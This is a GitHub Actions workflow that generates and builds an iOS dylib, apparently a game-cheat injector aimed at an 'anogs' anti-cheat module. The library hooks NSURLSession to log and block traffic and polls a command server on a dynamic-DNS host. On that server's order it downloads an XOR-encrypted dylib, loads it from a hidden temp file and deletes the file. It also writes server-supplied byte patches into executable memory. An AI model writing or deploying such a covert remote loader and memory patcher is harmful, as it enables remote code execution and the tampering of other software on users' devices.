name: Sovereign-Pro-Build

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: macos-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Generate and Compile Sovereign Core
        run: |
          # [!] Generating Clean Source Code (Zero Arabic In-Code) to prevent encoding crashes
          cat << 'EOF' > main.mm
          #import <UIKit/UIKit.h>
          #import <mach-o/dyld.h>
          #import <mach/mach.h>
          #import <Foundation/Foundation.h>
          #import <objc/runtime.h>
          #import <dlfcn.h>
          #import <unistd.h>

          // [1] COMMAND CENTER COORDINATES (No-IP Link)
          #define SERVER_API @"http://jojolmlm.hopto.org/dashboard_v70_pro.php?api=true"
          #define PAYLOAD_URL @"http://jojolmlm.hopto.org/sovereign_payload.dylib"
          #define WSAM_KEY 0x57 

          static NSMutableArray *blockedUrls = nil;
          static BOOL isPayloadInjected = NO;

          @interface SovereignEliteHUD : UIView
          @property (nonatomic, strong) UILabel *statusLabel;
          @property (nonatomic, strong) UIView *lamp;
          @property (nonatomic, strong) UITextView *netTerminal;
          @property (nonatomic, strong) UITextView *fileTerminal;
          @end

          @implementation SovereignEliteHUD

          // =========================================================
          // [2] STABLE HOOKS (Network Only - Identity Spoofing Removed)
          // =========================================================
          + (void)load {
              static dispatch_once_t onceToken;
              dispatch_once(&onceToken, ^{
                  blockedUrls = [[NSMutableArray alloc] init];

                  // Network Interception for Recon & Blocking
                  Method origNet = class_getInstanceMethod([NSURLSession class], @selector(dataTaskWithRequest:completionHandler:));
                  Method swizNet = class_getInstanceMethod([self class], @selector(sov_dataTaskWithRequest:completionHandler:));
                  method_exchangeImplementations(origNet, swizNet);
              });
          }

          - (id)sov_dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error))completionHandler {
              NSString *url = request.URL.absoluteString;
              [[NSNotificationCenter defaultCenter] postNotificationName:@"SovereignLog" object:url];
              
              for (NSString *blocked in blockedUrls) {
                  if (blocked.length > 3 && [url containsString:blocked]) return nil; 
              }
              return [self sov_dataTaskWithRequest:request completionHandler:completionHandler];
          }

          // =========================================================
          // [3] VOLATILE PAYLOAD ENGINE
          // =========================================================
          - (void)igniteVolatilePulse {
              [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:PAYLOAD_URL] completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
                  if (!data || data.length < 100) return;
                  
                  // Decrypt in RAM
                  uint8_t *buffer = (uint8_t *)[data bytes];
                  NSMutableData *dec = [NSMutableData dataWithLength:data.length];
                  uint8_t *dest = (uint8_t *)[dec mutableBytes];
                  for (NSUInteger i = 0; i < data.length; i++) { dest[i] = buffer[i] ^ WSAM_KEY; }

                  // Temporary birth on disk
                  NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@".sys_cache_wsam.dylib"];
                  [dec writeToFile:path atomically:YES];

                  // Injection and immediate execution
                  void *h = dlopen([path UTF8String], RTLD_NOW);
                  if (h) {
                      isPayloadInjected = YES;
                      unlink([path UTF8String]); // TOTAL PURGE
                      dispatch_async(dispatch_get_main_queue(), ^{
                          self.statusLabel.text = @"PAYLOAD INJECTED & PURGED";
                          self.statusLabel.textColor = [UIColor greenColor];
                      });
                  }
              }] resume];
          }

          // =========================================================
          // [4] SAFE MEMORY PATCH ENGINE (Anti-Crash)
          // =========================================================
          - (void)executeSovereignPatches:(NSArray *)payloads {
              uintptr_t shadowBase = _dyld_get_image_vmaddr_slide(0);
              uintptr_t anogsBase = 0;
              uint32_t count = _dyld_image_count();
              for (uint32_t i = 0; i < count; i++) {
                  const char *name = _dyld_get_image_name(i);
                  if (name && strstr(name, "anogs")) { anogsBase = _dyld_get_image_vmaddr_slide(i); break; }
              }

              mach_port_t task = mach_task_self();
              for (NSDictionary *patch in payloads) {
                  NSString *targetFile = patch[@"file_name"];
                  uintptr_t base = ([targetFile containsString:@"anogs"]) ? anogsBase : shadowBase;
                  if (base == 0) continue;

                  uintptr_t addr = strtoull([patch[@"address"] UTF8String], NULL, 16);
                  uintptr_t targetAddr = base + addr;
                  NSString *hexStr = patch[@"hex_val"];
                  
                  NSString *cleanHex = [hexStr stringByReplacingOccurrencesOfString:@" " withString:@""];
                  if ([cleanHex hasPrefix:@"0x"]) cleanHex = [cleanHex substringFromIndex:2];
                  
                  NSMutableData *data = [NSMutableData data];
                  for (int i = 0; i + 2 <= cleanHex.length; i += 2) {
                      unsigned int v; [[NSScanner scannerWithString:[cleanHex substringWithRange:NSMakeRange(i, 2)]] scanHexInt:&v];
                      unsigned char c = (unsigned char)v; [data appendBytes:&c length:1];
                  }

                  // USE VM_PROT_COPY to prevent SIGKILL on iOS 18
                  kern_return_t kr = vm_protect(task, (vm_address_t)targetAddr, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
                  if (kr == KERN_SUCCESS) {
                      vm_write(task, (vm_address_t)targetAddr, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
                      vm_protect(task, (vm_address_t)targetAddr, data.length, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
                  }
              }
          }

          // =========================================================
          // [5] MOBILE UI IMPLEMENTATION
          // =========================================================
          - (instancetype)initWithFrame:(CGRect)frame {
              self = [super initWithFrame:frame];
              if (self) {
                  self.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
                  self.layer.cornerRadius = 15;
                  self.layer.borderColor = [UIColor cyanColor].CGColor;
                  self.layer.borderWidth = 1.5;

                  UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(0, 5, frame.size.width, 15)];
                  title.text = @"SOVEREIGN ELITE v100k";
                  title.textColor = [UIColor cyanColor];
                  title.font = [UIFont boldSystemFontOfSize:9];
                  title.textAlignment = NSTextAlignmentCenter;
                  [self addSubview:title];

                  self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(10, 22, 160, 20)];
                  self.statusLabel.text = @"UPLINKING TO NO-IP...";
                  self.statusLabel.textColor = [UIColor whiteColor];
                  self.statusLabel.font = [UIFont systemFontOfSize:10];
                  [self addSubview:self.statusLabel];

                  self.lamp = [[UIView alloc] initWithFrame:CGRectMake(frame.size.width - 25, 25, 12, 12)];
                  self.lamp.backgroundColor = [UIColor orangeColor];
                  self.lamp.layer.cornerRadius = 6;
                  [self addSubview:self.lamp];

                  self.netTerminal = [[UITextView alloc] initWithFrame:CGRectMake(10, 50, frame.size.width - 20, 55)];
                  self.netTerminal.backgroundColor = [UIColor blackColor];
                  self.netTerminal.textColor = [UIColor greenColor];
                  self.netTerminal.font = [UIFont fontWithName:@"Courier" size:7];
                  self.netTerminal.editable = NO;
                  [self addSubview:self.netTerminal];

                  self.fileTerminal = [[UITextView alloc] initWithFrame:CGRectMake(10, 110, frame.size.width - 20, 55)];
                  self.fileTerminal.backgroundColor = [UIColor blackColor];
                  self.fileTerminal.textColor = [UIColor yellowColor];
                  self.fileTerminal.font = [UIFont fontWithName:@"Courier" size:7];
                  self.fileTerminal.editable = NO;
                  [self addSubview:self.fileTerminal];

                  [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(onLogEvent:) name:@"SovereignLog" object:nil];
                  
                  [self startSyncLoop];
                  [self scanFiles];
                  [self enableDrag];
              }
              return self;
          }

          - (void)onLogEvent:(NSNotification *)n {
              dispatch_async(dispatch_get_main_queue(), ^{
                  self.netTerminal.text = [NSString stringWithFormat:@"%@\n> %@", self.netTerminal.text, n.object];
                  [self.netTerminal scrollRangeToVisible:NSMakeRange(self.netTerminal.text.length - 1, 1)];
              });
          }

          - (void)scanFiles {
              uint32_t count = _dyld_image_count();
              for (uint32_t i = 0; i < count; i++) {
                  const char *name = _dyld_get_image_name(i);
                  if (name) {
                      NSString *p = [[NSString stringWithUTF8String:name] lastPathComponent];
                      if ([p containsString:@"Shadow"] || [p containsString:@"anogs"]) {
                          self.fileTerminal.text = [NSString stringWithFormat:@"%@\n* %@", self.fileTerminal.text, p];
                      }
                  }
              }
          }

          - (void)startSyncLoop {
              NSURL *url = [NSURL URLWithString:SERVER_API];
              NSURLRequest *req = [NSURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:10.0];
              [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
                  dispatch_async(dispatch_get_main_queue(), ^{
                      if (err || !data) return;
                      NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                      if (!json) return;

                      if ([json[@"maintenance"] intValue] == 1) { [self showLock:json[@"lock_msg"]]; return; }

                      [blockedUrls removeAllObjects];
                      if (json[@"blocked_urls"]) [blockedUrls addObjectsFromArray:json[@"blocked_urls"]];

                      if (json[@"payload"]) { [self executeSovereignPatches:json[@"payload"]]; }

                      // Volatile Trigger
                      if ([json[@"payload_status"] intValue] == 1 && !isPayloadInjected) { [self igniteVolatilePulse]; }

                      self.statusLabel.text = json[@"notification"];
                      if ([json[@"status"] isEqualToString:@"safe"]) {
                          self.lamp.backgroundColor = [UIColor greenColor];
                          self.layer.borderColor = [UIColor greenColor].CGColor;
                      } else {
                          self.lamp.backgroundColor = [UIColor redColor];
                          self.layer.borderColor = [UIColor redColor].CGColor;
                      }
                  });
              }] resume];
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [self startSyncLoop]; });
          }

          - (void)showLock:(NSString *)m {
              UIWindow *win = [UIApplication sharedApplication].keyWindow;
              if ([win viewWithTag:2026]) return;
              UIView *v = [[UIView alloc] initWithFrame:win.bounds];
              v.tag = 2026; v.backgroundColor = [UIColor blackColor];
              UILabel *l = [[UILabel alloc] initWithFrame:v.bounds];
              l.text = [NSString stringWithFormat:@"🛑 SYSTEM MAINTENANCE:\n%@", m];
              l.textColor = [UIColor whiteColor]; l.textAlignment = NSTextAlignmentCenter;
              l.numberOfLines = 0; [v addSubview:l]; [win addSubview:v];
          }

          - (void)enableDrag {
              self.userInteractionEnabled = YES;
              UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(onDrag:)];
              [self addGestureRecognizer:pan];
          }
          - (void)onDrag:(UIPanGestureRecognizer *)s {
              CGPoint t = [s translationInView:self.superview];
              self.center = CGPointMake(self.center.x + t.x, self.center.y + t.y);
              [s setTranslation:CGPointZero inView:self.superview];
          }
          @end

          void __attribute__((constructor)) start_v100k_core() {
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                  UIWindow *win = [UIApplication sharedApplication].keyWindow;
                  if (win) {
                      SovereignEliteHUD *ui = [[SovereignEliteHUD alloc] initWithFrame:CGRectMake(40, 50, 220, 180)];
                      [win addSubview:ui];
                  }
              });
          }
          EOF

          # [!] Stable Compilation for arm64
          export SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
          clang -dynamiclib -arch arm64 main.mm -o Sovereign.dylib \
          -isysroot $SDK_PATH \
          -framework Foundation -framework UIKit -framework CoreGraphics \
          -fobjc-arc -Os -w -lc++

      - name: Upload Sovereign Dylib
        uses: actions/upload-artifact@v4
        with:
          name: Sovereign-v100k-Stable
          path: Sovereign.dylib
